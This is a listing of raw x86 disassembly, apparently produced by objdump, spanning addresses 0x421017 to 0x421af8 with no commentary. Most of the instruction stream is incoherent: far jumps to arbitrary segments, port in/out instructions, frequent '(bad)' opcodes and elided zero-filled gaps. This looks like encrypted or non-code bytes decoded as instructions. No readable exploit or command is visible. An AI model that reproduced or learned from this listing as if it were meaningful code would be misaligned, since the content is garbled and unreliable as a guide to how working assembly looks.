  421017:	cmp    ch,bh
  421019:	ins    DWORD PTR es:[edi],dx
  42101a:	cmp    al,0xa1
  42101c:	std    
  42101d:	jmp    0xd2e1:0xcc46b608
  421024:	or     DWORD PTR [ecx-0x9397493],ebp
  42102a:	das    
  42102b:	mov    eax,0x26068d49
  421030:	pop    es
  421031:	add    al,0x94
  421033:	sub    eax,0xa60868de
  421038:	inc    eax
  421039:	xlat   BYTE PTR ds:[ebx]
  42103a:	aad    0x7d
  42103c:	inc    ebx
  42103d:	ds and bh,al
  421040:	fimul  WORD PTR [esi-0x73]
  421043:	and    BYTE PTR ds:0x371d52da,ah
  421049:	and    ebx,ebx
  42104b:	jb     0x421096
  42104d:	mov    ds:0x175d4770,eax
  421052:	ret    
  421053:	push   edi
  421054:	out    0x3c,al
  421056:	sbb    eax,0xbab7beb0
  42105b:	out    dx,eax
  42105c:	and    DWORD PTR [edi],esp
  42105e:	jmp    0xd3c4:0xb12566b9
  421065:	mov    esp,0xf87541ab
  42106a:	ficom  DWORD PTR [edi]
  42106c:	lods   eax,DWORD PTR ds:[esi]
  42106d:	rol    edx,1
  42106f:	cs sub al,0x2e
  421072:	addr16 aas 
  421074:	js     0x42109a
  421076:	push   ebp
  421077:	cdq    
  421078:	lods   al,BYTE PTR ds:[esi]
  421079:	mov    esi,0x7c1c47ee
  42107e:	fisub  WORD PTR [edx]
  421080:	push   eax
  421081:	in     al,dx
  421082:	pop    esp
  421083:	mov    eax,0x4060bd64
  421088:	nop
  421089:	js     0x4210a6
  42108b:	pop    ecx
  42108c:	out    dx,al
  42108d:	jne    0x4210ec
  42108f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421090:	shr    BYTE PTR [eax+edi*8],1
  421093:	sub    al,0xeb
  421095:	or     eax,0xdc0539f0
  42109a:	mov    edx,DWORD PTR [esi+0x6bb71ed0]
  4210a0:	inc    ebx
  4210a1:	mov    ah,0xfb
  4210a3:	mov    dl,0x18
  4210a5:	xchg   edx,eax
  4210a6:	xor    eax,DWORD PTR ss:[ebx-0x29]
  4210aa:	gs dec eax
  4210ac:	outs   dx,DWORD PTR ds:[esi]
  4210ad:	mov    edx,DWORD PTR [edx-0x6abb93c9]
  4210b3:	pop    ds
  4210b4:	mov    ecx,0x12a7b184
  4210b9:	and    al,0xad
  4210bb:	sbb    BYTE PTR [edi-0x34],ah
  4210be:	out    dx,eax
  4210bf:	imul   BYTE PTR [ebp+0x0]
	...
  421131:	add    BYTE PTR [eax],al
  421133:	add    BYTE PTR [ebx-0x31],dh
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4210fe
  421141:	adc    al,0xa6
  421143:	adc    al,0xf6
  421145:	popa   
  421146:	add    DWORD PTR [eax],eax
  421148:	cmc    
  421149:	add    BYTE PTR [eax],al
  42114b:	add    BYTE PTR [ebx],al
  42114d:	mov    eax,ds:0x7d6f4f71
  421152:	pop    ss
  421153:	inc    eax
  421154:	in     al,0xc
  421156:	imul   eax,DWORD PTR [ebp+0x7b],0xffffffb0
  42115a:	fldenv [eax+0x75]
  42115d:	jle    0x421176
  42115f:	sbb    esp,DWORD PTR [esi+ebx*8+0x1a]
  421163:	clc    
  421164:	inc    ebp
  421165:	fucom  st(7)
  421167:	sub    edi,DWORD PTR [eax+0x5b66f1d5]
  42116d:	and    eax,0x11bc8287
  421172:	mov    esi,0x4d545905
  421177:	jmp    0x42111a
  421179:	in     al,0xdc
  42117b:	test   al,0x1a
  42117d:	mov    esp,0x1bf4f049
  421182:	adc    eax,0x260685bf
  421187:	cmp    eax,0xbe9b52c3
  42118c:	jg     0x421209
  42118e:	out    0x48,al
  421190:	cmp    al,0x3f
  421192:	pop    ds
  421193:	mov    BYTE PTR [ebx+0x13168029],cl
  421199:	jle    0x42120c
  42119b:	adc    al,0xea
  42119d:	imul   ebx,ecx,0x14525d08
  4211a3:	cld    
  4211a4:	mov    edx,0xceb90db3
  4211a9:	fdivr  QWORD PTR [esi-0x21b4a3e9]
  4211af:	fimul  DWORD PTR [edi-0x1d]
  4211b2:	adc    esi,DWORD PTR [esi]
  4211b4:	mov    edx,0xde125d5
  4211b9:	inc    edi
  4211ba:	retf   
  4211bb:	leave  
  4211bc:	inc    eax
  4211bd:	mov    al,ds:0xcc6276f2
  4211c2:	aad    0xef
  4211c4:	cmp    eax,0xcfa85bb0
  4211c9:	jb     0x42118d
  4211cb:	cmp    al,0xdc
  4211cd:	dec    ebx
  4211ce:	jbe    0x421150
  4211d0:	cmc    
  4211d1:	mov    ebp,0xdc4392e5
  4211d6:	dec    eax
  4211d7:	(bad)  
  4211d8:	aas    
  4211d9:	dec    eax
  4211da:	mov    eax,ds:0xb6321c1c
  4211df:	mov    ecx,0xf87199e1
  4211e4:	sub    DWORD PTR [edx-0x70],ecx
  4211e7:	lods   eax,DWORD PTR ds:[esi]
  4211e8:	push   ecx
  4211e9:	js     0x421203
  4211eb:	ret    0x28fa
  4211ee:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4211f0:	push   ebp
  4211f1:	sbb    ecx,DWORD PTR [esi]
  4211f3:	jae    0x421226
  4211f5:	or     al,0xed
  4211f7:	call   0x23c2ebd9
  4211fc:	push   esp
  4211fd:	sbb    DWORD PTR [ecx+0x7d],edx
  421200:	fist   DWORD PTR [eax]
  421202:	pop    ebx
  421203:	sub    DWORD PTR ds:0x5ce5b7bb,0xffffffe8
  42120a:	push   esp
  42120b:	repnz ins DWORD PTR es:[edi],dx
  42120d:	ret    
  42120e:	int3   
  42120f:	push   es
  421210:	adc    ah,al
  421212:	(bad)  
  421213:	dec    esp
  421214:	call   0x15bd:0x4fc19b6f
  42121b:	shl    BYTE PTR [esp+edx*4+0x44ca62cf],cl
  421222:	addr16 icebp 
  421224:	repnz sub DWORD PTR [eax-0x1],0x64
  421229:	cdq    
  42122a:	xchg   edx,eax
  42122b:	lea    esp,[ecx-0x1242b7dc]
  421231:	fldcw  WORD PTR [esi-0xbaf2594]
  421237:	fmul   QWORD PTR [edi]
  421239:	xor    eax,0xc4f2e22b
  42123e:	jmp    0x4211d8
  421240:	mov    bl,0x0
	...
  4212b2:	add    BYTE PTR [eax],al
  4212b4:	inc    ecx
  4212b5:	push   es
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0xa783dc15
  4212c1:	mov    bl,BYTE PTR [ebx+0x162eb38]
  4212c7:	add    ch,dh
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    BYTE PTR [esp+ebp*8],dl
  4212ce:	pop    esi
  4212cf:	fimul  WORD PTR [esi]
  4212d1:	cmc    
  4212d2:	sbb    edi,DWORD PTR [esi-0x3d60da75]
  4212d8:	ins    BYTE PTR es:[edi],dx
  4212d9:	(bad)  
  4212da:	outs   dx,DWORD PTR ds:[esi]
  4212db:	cmp    ebx,ebp
  4212dd:	jecxz  0x421327
  4212df:	cmp    DWORD PTR [edi-0xf],edx
  4212e2:	inc    eax
  4212e3:	mov    ch,0xfe
  4212e5:	dec    esp
  4212e6:	(bad)  
  4212e7:	pop    ebx
  4212e8:	push   ebp
  4212e9:	out    0xe8,eax
  4212eb:	jns    0x42130b
  4212ed:	mov    WORD PTR [edi-0x353b37fc],ss
  4212f3:	pop    ebp
  4212f4:	jno    0x4212dd
  4212f6:	das    
  4212f7:	cmp    eax,0xc7aff47
  4212fc:	mov    esi,0x28506b4d
  421301:	dec    esi
  421302:	xchg   edx,eax
  421303:	cmp    eax,0x8442e625
  421308:	xor    BYTE PTR [ebx+ebp*8],ah
  42130b:	and    bl,BYTE PTR [ebx-0x1246a261]
  421311:	pusha  
  421312:	lahf   
  421313:	mov    edi,0xe678a487
  421318:	push   es
  421319:	dec    esi
  42131a:	test   eax,0x36f3e18d
  42131f:	push   eax
  421320:	cs enter 0xa284,0x45
  421325:	mov    eax,0x9793fece
  42132a:	mov    bh,0x26
  42132c:	out    dx,al
  42132d:	xchg   ebp,eax
  42132e:	or     DWORD PTR [edi-0x35136ed0],ecx
  421334:	iret   
  421335:	mov    dh,0x8b
  421337:	lock jno 0x421358
  42133a:	xor    ch,BYTE PTR [esi+0x5f]
  42133d:	inc    ebp
  42133e:	jge    0x4212ce
  421340:	outs   dx,BYTE PTR ds:[esi]
  421341:	outs   dx,BYTE PTR ds:[esi]
  421342:	(bad)  
  421343:	sub    eax,0x83b17ec4
  421348:	xchg   edi,eax
  421349:	push   0xb2567f33
  42134e:	sbb    edx,esp
  421350:	push   esp
  421351:	ja     0x421308
  421353:	sbb    DWORD PTR ds:0x592a553c,ecx
  421359:	inc    esp
  42135a:	xchg   BYTE PTR [esi+0x9],ch
  42135d:	scas   eax,DWORD PTR es:[edi]
  42135e:	outs   dx,DWORD PTR ds:[esi]
  42135f:	push   ebx
  421360:	push   eax
  421361:	clc    
  421362:	dec    ebx
  421363:	sbb    al,BYTE PTR fs:[esi+ebx*4-0x15bbe170]
  42136b:	and    DWORD PTR [esi+0x435f534d],edi
  421371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421372:	dec    ebp
  421373:	retf   0x9217
  421376:	fs and edi,esp
  421379:	xchg   DWORD PTR [ebp+esi*8-0x563101bf],ecx
  421380:	(bad)  
  421381:	call   0x11c6f59d
  421386:	push   ds
  421387:	sub    BYTE PTR [ebp-0x8],al
  42138a:	mov    eax,ds:0xc3422426
  42138f:	cmp    BYTE PTR [di],cl
  421392:	xlat   BYTE PTR ds:[ebx]
  421393:	jp     0x421333
  421395:	mov    bl,0x19
  421397:	or     al,0x13
  421399:	jae    0x421403
  42139b:	pop    ebx
  42139c:	icebp  
  42139d:	aaa    
  42139e:	pop    ebp
  42139f:	(bad)  
  4213a0:	sbb    ebp,esi
  4213a2:	lahf   
  4213a3:	sbb    DWORD PTR [ebx-0x40],ebp
  4213a6:	sar    BYTE PTR [ebp+0x6f],1
  4213a9:	mov    eax,0xcad7c5b0
  4213ae:	fnsave [ebx-0x2fbe2260]
  4213b4:	mov    bl,BYTE PTR [ebx+esi*8]
  4213b7:	xor    DWORD PTR [ecx-0x1a9e6ad1],esp
  4213bd:	test   BYTE PTR [ebx],bl
  4213bf:	dec    edx
  4213c0:	out    0x0,al
	...
  421432:	add    BYTE PTR [eax],al
  421434:	scas   al,BYTE PTR es:[edi]
  421435:	xchg   esp,eax
  421436:	push   edi
  421437:	adc    bh,BYTE PTR [edi-0x2d]
  42143a:	out    dx,eax
  42143b:	mov    esp,0x960320e2
  421440:	sub    DWORD PTR [ecx+0x63e01979],edi
  421446:	add    DWORD PTR [eax],eax
  421448:	cmc    
  421449:	add    BYTE PTR [eax],al
  42144b:	add    BYTE PTR [ebx],dh
  42144d:	idiv   cl
  42144f:	fisttp DWORD PTR [esi]
  421451:	fs xchg ecx,eax
  421453:	add    eax,0xdbc9fafb
  421458:	cmp    ch,BYTE PTR [eax]
  42145a:	ds mov ah,0x30
  42145d:	push   ss
  42145e:	inc    edx
  42145f:	lods   al,BYTE PTR ds:[esi]
  421460:	xchg   esp,eax
  421461:	add    DWORD PTR [ebx+ebx*2+0x41],edx
  421465:	clc    
  421466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421467:	int3   
  421468:	dec    eax
  421469:	loope  0x421402
  42146b:	dec    esp
  42146c:	inc    ebx
  42146d:	inc    ebx
  42146e:	loop   0x421499
  421470:	cld    
  421471:	dec    ebx
  421472:	sbb    DWORD PTR [edi],esp
  421474:	mov    es:0xa966bf5c,eax
  42147a:	cmp    BYTE PTR [esi],al
  42147c:	je     0x42145d
  42147e:	cdq    
  42147f:	xchg   edx,eax
  421480:	(bad)  
  421481:	retf   
  421482:	sbb    cl,dh
  421484:	mov    ds:0xfc775163,al
  421489:	inc    eax
  42148a:	inc    ecx
  42148b:	cwde   
  42148c:	dec    esp
  42148d:	call   0x5f25:0x11fedad
  421494:	test   al,ch
  421496:	lahf   
  421497:	pop    ss
  421498:	stos   BYTE PTR es:[edi],al
  421499:	jbe    0x421453
  42149b:	push   0x23
  42149d:	push   ecx
  42149e:	aam    0x56
  4214a0:	retf   
  4214a1:	shl    BYTE PTR [esi],cl
  4214a3:	loope  0x4214df
  4214a5:	dec    eax
  4214a6:	push   edx
  4214a7:	cmovne esp,DWORD PTR [ebp+0x2512309f]
  4214ae:	push   0x34
  4214b0:	es pop ds
  4214b2:	out    0x80,al
  4214b4:	stc    
  4214b5:	aam    0x68
  4214b7:	dec    esp
  4214b8:	jo     0x421461
  4214ba:	mov    bh,0xe9
  4214bc:	push   eax
  4214bd:	mov    ah,0xe3
  4214bf:	xchg   esp,eax
  4214c0:	jo     0x56edd8ae
  4214c6:	mov    ebp,0x12da3e3d
  4214cb:	cmp    eax,0x1cdda735
  4214d0:	shl    esp,cl
  4214d2:	add    al,0xec
  4214d4:	push   ebp
  4214d5:	xor    eax,0x83e4714c
  4214da:	cmp    eax,DWORD PTR [ecx-0x36]
  4214dd:	and    al,0x7d
  4214df:	jmp    0x4214a0
  4214e1:	ins    DWORD PTR es:[edi],dx
  4214e2:	icebp  
  4214e3:	push   eax
  4214e4:	mov    ds:0xda771c69,eax
  4214e9:	sub    esp,eax
  4214eb:	mov    esp,0x5cb45712
  4214f0:	fiadd  WORD PTR [eax+0x64]
  4214f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214f4:	and    eax,0x4174de22
  4214f9:	jmp    0xc5cd:0xbc837909
  421500:	xor    BYTE PTR [edi+0x15],0xad
  421504:	call   0x183748ce
  421509:	add    al,0xee
  42150b:	lods   al,BYTE PTR ds:[esi]
  42150c:	jp     0x421501
  42150e:	add    ah,BYTE PTR [eax]
  421510:	push   ds
  421511:	sub    BYTE PTR [ecx],bl
  421513:	scas   al,BYTE PTR es:[edi]
  421514:	mov    ecx,0xaa6a49ee
  421519:	adc    dh,bh
  42151b:	data16 aaa 
  42151d:	jno    0x42151b
  42151f:	outs   dx,BYTE PTR ds:[esi]
  421520:	test   DWORD PTR ds:0x802cd03c,esi
  421526:	(bad)  
  421527:	(bad)  
  421528:	mov    ch,0x9a
  42152a:	(bad)  
  42152b:	mov    esp,0x4eef88e
  421530:	call   0x8ca8:0x1fc392ab
  421537:	in     eax,dx
  421538:	sub    eax,0x9ccafcf9
  42153d:	mov    al,ds:0x637804
	...
  4215b2:	add    BYTE PTR [eax],al
  4215b4:	test   BYTE PTR [eax-0x48],ch
  4215b7:	or     ah,bh
  4215b9:	fdiv   DWORD PTR [esp+ebp*8-0x55f32d34]
  4215c0:	jmp    0xd60e6b3d
  4215c5:	add    DWORD PTR fs:[eax],eax
  4215c8:	cmc    
  4215c9:	add    BYTE PTR [eax],al
  4215cb:	add    ah,bl
  4215cd:	push   esi
  4215ce:	or     eax,ecx
  4215d0:	in     al,0x14
  4215d2:	arpl   WORD PTR [eax+ebp*2+0x6f],dx
  4215d6:	lock xor ebp,DWORD PTR [ecx+0x7b63e714]
  4215dd:	ins    BYTE PTR es:[edi],dx
  4215de:	jns    0x421651
  4215e0:	arpl   bx,ax
  4215e2:	das    
  4215e3:	iret   
  4215e4:	shl    esi,1
  4215e6:	call   0xf7038b2
  4215eb:	imul   ecx,DWORD PTR [ecx+0x45],0x1231899f
  4215f2:	in     al,0xf4
  4215f4:	mov    al,ds:0x575bf91f
  4215f9:	out    dx,al
  4215fa:	out    dx,al
  4215fb:	mov    ebp,ecx
  4215fd:	dec    eax
  4215fe:	mov    ds:0xf9ee871f,eax
  421603:	test   eax,0x567af9cc
  421608:	inc    esi
  421609:	cmp    BYTE PTR [ebx-0x4f],cl
  42160c:	mov    cl,0xea
  42160e:	add    ebp,esp
  421610:	sahf   
  421611:	xchg   edi,eax
  421612:	inc    ebp
  421613:	shl    BYTE PTR [edi-0x21],cl
  421616:	mov    edx,0xd898dd73
  42161b:	xchg   BYTE PTR ds:0xcc736bcc,dl
  421621:	fsubr  DWORD PTR [edi+0x2cfdeb50]
  421627:	outs   dx,BYTE PTR es:[esi]
  421629:	loopne 0x42162e
  42162b:	mov    esp,0x713ac20b
  421630:	cmp    dl,BYTE PTR [esi]
  421632:	ins    DWORD PTR es:[edi],dx
  421633:	mov    esi,0xf767a8d4
  421638:	loopne 0x421628
  42163a:	and    esp,edx
  42163c:	fldenv [ebx-0x547c8d92]
  421642:	cdq    
  421643:	pop    ebx
  421644:	das    
  421645:	ins    DWORD PTR es:[edi],dx
  421646:	ds jecxz 0x4215ed
  421649:	add    esp,DWORD PTR [edx]
  42164b:	(bad)  
  42164c:	jge    0x4215dd
  42164e:	jmp    0x4216a1
  421650:	call   0x7be1:0xeb622aa
  421657:	sbb    DWORD PTR ds:0x7aa4f01b,0x62
  42165e:	xchg   edi,eax
  42165f:	fs dec esi
  421661:	sbb    dh,0xd8
  421664:	push   esp
  421665:	int    0xb8
  421667:	mov    eax,0xf234ce21
  42166c:	fldcw  WORD PTR [esi-0x5900073b]
  421672:	lahf   
  421673:	test   BYTE PTR [eax],ah
  421675:	shl    BYTE PTR [edx+0x56df53e],1
  42167b:	or     DWORD PTR [edi-0x48],esi
  42167e:	inc    edi
  42167f:	hlt    
  421680:	inc    edx
  421681:	sbb    dl,BYTE PTR cs:[edi+0x58]
  421685:	push   esp
  421686:	fninit 
  421688:	data16 fwait
  42168a:	dec    ebp
  42168b:	adc    BYTE PTR [edx],0xd0
  42168e:	adc    dl,BYTE PTR [ebp-0x1c7eb546]
  421694:	stc    
  421695:	push   0xc90e259b
  42169a:	ja     0x4216f1
  42169c:	push   cs
  42169d:	jp     0x42164d
  42169f:	sbb    al,0x36
  4216a1:	nop
  4216a2:	aam    0x15
  4216a4:	pop    edx
  4216a5:	push   ss
  4216a6:	pushf  
  4216a7:	cmp    eax,ecx
  4216a9:	dec    esp
  4216aa:	xor    eax,0x51e45d59
  4216af:	shl    esp,1
  4216b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216b2:	inc    edx
  4216b3:	adc    al,0x1
  4216b5:	sbb    eax,DWORD PTR [esi+0x1530bbf6]
  4216bb:	cmc    
  4216bc:	inc    esp
  4216bd:	aad    0x1e
  4216bf:	and    DWORD PTR [edi+0x0],edx
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    edi,DWORD PTR [edi+edi*2+0x65ca1e53]
  421746:	add    DWORD PTR [eax],eax
  421748:	cmc    
  421749:	add    BYTE PTR [eax],al
  42174b:	add    BYTE PTR ds:0xd9796179,dl
  421751:	jmp    0x8e072ab9
  421756:	ret    
  421757:	enter  0xde5b,0xa7
  42175b:	out    0x84,eax
  42175d:	test   eax,0xe7cbd4d5
  421762:	xor    dh,cl
  421764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421765:	jmp    0x90435a6a
  42176a:	or     BYTE PTR [ebx-0x2a],bh
  42176d:	mov    cl,0xe8
  42176f:	add    eax,0x724f43f0
  421774:	dec    ebp
  421775:	inc    esi
  421776:	addr16 mov al,0x37
  421779:	mov    DWORD PTR [edx-0x3f],ebp
  42177c:	or     DWORD PTR [ecx-0x5e93637c],esi
  421782:	mov    ch,0x6c
  421784:	mov    ebp,0xa8765044
  421789:	cmp    BYTE PTR [edi+0x7d],cl
  42178c:	outs   dx,BYTE PTR ds:[esi]
  42178d:	inc    ebx
  42178e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42178f:	xor    eax,0x41f07eeb
  421794:	mov    eax,0x7967f6a8
  421799:	pop    ss
  42179a:	mov    ds,ebx
  42179c:	sbb    ebx,DWORD PTR [edx+0x30e85041]
  4217a2:	ret    
  4217a3:	push   ebp
  4217a4:	jns    0x421773
  4217a6:	outs   dx,BYTE PTR ds:[esi]
  4217a7:	daa    
  4217a8:	or     BYTE PTR [esi],0x76
  4217ab:	dec    ebp
  4217ac:	inc    edx
  4217ad:	jle    0x42179e
  4217af:	call   FWORD PTR [edi]
  4217b1:	(bad)
  4217b5:	out    0xe7,al
  4217b7:	dec    edx
  4217b8:	cmp    al,0x11
  4217ba:	xchg   ebp,eax
  4217bb:	mov    dh,0xbe
  4217bd:	push   esp
  4217be:	leave  
  4217bf:	push   ebx
  4217c0:	ret    
  4217c1:	pinsrw mm7,eax,0xe8
  4217c5:	adc    DWORD PTR gs:[edi+eax*2],eax
  4217c9:	cmp    eax,0x5d1f0d2b
  4217ce:	pop    ebp
  4217cf:	ret    0x4fb6
  4217d2:	adc    DWORD PTR [edx],ebp
  4217d4:	dec    edi
  4217d5:	(bad)  
  4217d6:	std    
  4217d7:	out    0x93,eax
  4217d9:	pop    edi
  4217da:	stos   BYTE PTR es:[edi],al
  4217db:	push   esi
  4217dc:	lods   al,BYTE PTR ds:[esi]
  4217dd:	ret    
  4217de:	cmc    
  4217df:	popa   
  4217e0:	outs   dx,BYTE PTR ds:[esi]
  4217e1:	or     BYTE PTR [ebx],ch
  4217e3:	mov    esi,0xaeffabdd
  4217e8:	lods   al,BYTE PTR ds:[esi]
  4217e9:	je     0x421803
  4217eb:	cmp    eax,0xcbf7aa59
  4217f0:	daa    
  4217f1:	add    cl,BYTE PTR [eax-0x5ec13f11]
  4217f7:	mov    fs,WORD PTR [edx-0x51]
  4217fa:	dec    ebp
  4217fb:	test   eax,0x858b89bc
  421800:	fst    QWORD PTR [ebx+eax*1+0x231b330a]
  421807:	adc    cl,BYTE PTR [edi-0x42]
  42180a:	dec    esp
  42180b:	repnz aaa 
  42180d:	(bad)  
  42180e:	into   
  42180f:	or     eax,0x183b19d8
  421814:	add    DWORD PTR [ebx+0x6fd1f2f6],0xffffffad
  42181b:	fcom   QWORD PTR [esi+0x50]
  42181e:	fs retf 
  421820:	xlat   BYTE PTR ds:[ebx]
  421821:	pop    esi
  421822:	mov    ch,dh
  421824:	mov    bl,0x3
  421826:	jmp    0x57fc670e
  42182b:	dec    edx
  42182c:	add    eax,0x41c9aeaf
  421831:	neg    bh
  421833:	imul   edx,DWORD PTR [eax],0xffffffd2
  421836:	popa   
  421837:	lods   eax,DWORD PTR ds:[esi]
  421838:	ins    DWORD PTR es:[edi],dx
  421839:	arpl   WORD PTR ds:0xb37766fe,bp
  42183f:	shr    ah,cl
	...
  4218b1:	add    BYTE PTR [eax],al
  4218b3:	add    ah,bl
  4218b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b6:	jae    0x421905
  4218b8:	jnp    0x421899
  4218ba:	(bad)  
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ecx,DWORD PTR [esi]
  4218c1:	and    DWORD PTR [ecx],edx
  4218c3:	ins    DWORD PTR es:[edi],dx
  4218c4:	mov    edi,0xf5000166
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    BYTE PTR [ecx],al
  4218cd:	ja     0x421872
  4218cf:	imul   ebx,DWORD PTR [esi],0xffffffd9
  4218d2:	data16 mov BYTE PTR [esi-0x29],dl
  4218d6:	loop   0x421859
  4218d8:	dec    ebp
  4218d9:	push   0x70
  4218db:	retf   0x999d
  4218de:	lahf   
  4218df:	pop    edi
  4218e0:	scas   al,BYTE PTR es:[edi]
  4218e1:	adc    eax,0xccfdc53d
  4218e6:	mov    ds:0xfba699c4,eax
  4218eb:	loope  0x4218b4
  4218ed:	mov    BYTE PTR [edx+0x26],0x5
  4218f1:	cmp    esi,DWORD PTR [ebx-0x18]
  4218f4:	jmp    0x3751:0xd1417a0f
  4218fb:	xchg   BYTE PTR [edx+0x3efb7f36],al
  421901:	pop    edi
  421902:	or     ah,BYTE PTR ds:[ecx-0x70]
  421906:	popa   
  421907:	add    ch,BYTE PTR [edi-0x272f4a72]
  42190d:	jo     0x42197e
  42190f:	stos   BYTE PTR es:[edi],al
  421910:	pop    edx
  421911:	pop    ebp
  421912:	sbb    bl,bl
  421914:	addr16 xchg esp,eax
  421916:	(bad)  
  421917:	sub    eax,0x5d46495d
  42191c:	jno    0x4218d2
  42191e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42191f:	bnd jne 0x421978
  421922:	gs mov esp,0x43d353be
  421928:	cmp    DWORD PTR [edi+0x6c],ebp
  42192b:	dec    edx
  42192c:	test   BYTE PTR [esi],bh
  42192e:	inc    ebx
  42192f:	mov    ch,0x2d
  421931:	pop    eax
  421932:	jne    0x4218e5
  421934:	in     eax,0x27
  421936:	mov    ah,0x12
  421938:	repz loop 0x4218d0
  42193b:	inc    ebx
  42193c:	fcmovb st,st(5)
  42193e:	sub    BYTE PTR [ecx-0x2aedcad4],bh
  421944:	jmp    0x4219ac
  421946:	fidivr DWORD PTR [edx]
  421948:	int3   
  421949:	sub    DWORD PTR [eax+0x3a],ebp
  42194c:	call   0x931c:0x8c945486
  421953:	mov    dl,0x86
  421955:	fwait
  421956:	dec    esp
  421957:	clc    
  421958:	repz out 0x71,eax
  42195b:	jmp    0xafc70969
  421960:	push   edi
  421961:	sub    cl,dl
  421963:	and    BYTE PTR [edx+ebx*8],al
  421966:	xlat   BYTE PTR ds:[ebx]
  421967:	aam    0x83
  421969:	jecxz  0x421966
  42196b:	das    
  42196c:	add    BYTE PTR [ecx],ah
  42196e:	push   esp
  42196f:	cld    
  421970:	test   eax,0x7c030056
  421975:	mov    dh,0xc1
  421977:	jne    0x4219d6
  421979:	in     al,dx
  42197a:	xlat   BYTE PTR ds:[ebx]
  42197b:	add    dl,bh
  42197d:	popf   
  42197e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42197f:	xor    BYTE PTR [ecx+0x32],ch
  421982:	test   BYTE PTR [edi],ch
  421984:	dec    edx
  421985:	push   cs
  421986:	test   eax,0xdd9f5a9c
  42198b:	inc    ebx
  42198c:	jnp    0x42195f
  42198e:	jns    0x4219d5
  421990:	xor    al,BYTE PTR es:0xbc7151f5
  421997:	xor    esi,DWORD PTR [esp+ebx*1+0x7c4211f4]
  42199e:	loopne 0x421957
  4219a0:	inc    edx
  4219a1:	arpl   WORD PTR [eax+ebx*2+0x2a020a60],di
  4219a8:	push   esp
  4219a9:	(bad)  [ecx]
  4219ab:	int    0xa9
  4219ad:	int3   
  4219ae:	leave  
  4219af:	aad    0x22
  4219b1:	sbb    dh,bh
  4219b3:	push   edx
  4219b4:	cmp    eax,0xe465fbd9
  4219b9:	cmc    
  4219ba:	(bad)  
  4219bb:	lock jbe 0x421950
  4219be:	mov    esi,eax
  4219c0:	xchg   esi,eax
	...
  421a31:	add    BYTE PTR [eax],al
  421a33:	add    bh,bl
  421a35:	xor    ch,BYTE PTR [edi-0x6010ed]
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x423ee350]
  421a44:	mov    ah,0x67
  421a46:	add    DWORD PTR [eax],eax
  421a48:	cmc    
  421a49:	add    BYTE PTR [eax],al
  421a4b:	add    BYTE PTR [edx+esi*8-0x60],bh
  421a4f:	dec    eax
  421a50:	jb     0x421a37
  421a52:	or     BYTE PTR [edi],dh
  421a54:	dec    ebx
  421a55:	and    BYTE PTR [ebx+0x24],0xe4
  421a59:	lahf   
  421a5a:	adc    al,0xda
  421a5c:	adc    DWORD PTR ds:0xac9cc464,edi
  421a62:	mov    eax,ebp
  421a64:	ins    BYTE PTR es:[edi],dx
  421a65:	cmp    DWORD PTR [ebp-0x6c],ebx
  421a68:	test   eax,0xed821c50
  421a6d:	fs push eax
  421a6f:	out    0x5b,eax
  421a71:	gs dec edi
  421a73:	out    0x88,al
  421a75:	shl    BYTE PTR [edi+0x4b345ba4],cl
  421a7b:	fs mov dl,0x5d
  421a7e:	push   es
  421a7f:	xchg   ah,cl
  421a81:	push   ebx
  421a82:	cwde   
  421a83:	and    eax,0x7cbe0084
  421a88:	lahf   
  421a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a8a:	sbb    edi,DWORD PTR [eax]
  421a8c:	fimul  DWORD PTR [ebx+0x6a]
  421a8f:	popa   
  421a90:	pop    esp
  421a91:	rcl    DWORD PTR [eax+0x62],0x86
  421a95:	sbb    esi,DWORD PTR [eax]
  421a97:	cdq    
  421a98:	push   edx
  421a99:	jge    0x421a4c
  421a9b:	je     0x421a46
  421a9d:	xchg   ebp,eax
  421a9e:	inc    ebx
  421a9f:	in     eax,dx
  421aa0:	inc    ecx
  421aa1:	aaa    
  421aa2:	enter  0x487d,0xef
  421aa6:	(bad)  
  421aa7:	nop
  421aa8:	dec    edi
  421aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aaa:	or     DWORD PTR [eax-0x62d6f28d],esi
  421ab0:	int    0x6e
  421ab2:	adc    ebx,ebp
  421ab4:	in     eax,dx
  421ab5:	push   ebp
  421ab6:	rcl    BYTE PTR [ecx+eax*4+0x73bde9ab],cl
  421abd:	jno    0x421aae
  421abf:	mov    esi,0xd637f6e0
  421ac4:	(bad)  
  421ac5:	sbb    al,0x4e
  421ac7:	retf   
  421ac8:	cwde   
  421ac9:	divps  xmm3,xmm3
  421acc:	call   0x46a9:0x8db4df15
  421ad3:	pop    eax
  421ad4:	fsub   st(5),st
  421ad6:	retf   0x44f2
  421ad9:	xor    DWORD PTR [edi],0x49ce3f5a
  421adf:	mov    WORD PTR [esi-0x2d],gs
  421ae2:	add    al,0xfe
  421ae4:	jmp    0x421b4c
  421ae6:	xchg   esi,eax
  421ae7:	shr    ch,1
  421ae9:	nop
  421aea:	or     al,0x7c
  421aec:	pop    ss
  421aed:	int    0xc7
  421aef:	addr16 pop esp
  421af1:	mov    edx,0x681b2249
  421af6:	sub    cl,dh
  421af8:	in     eax,0x42
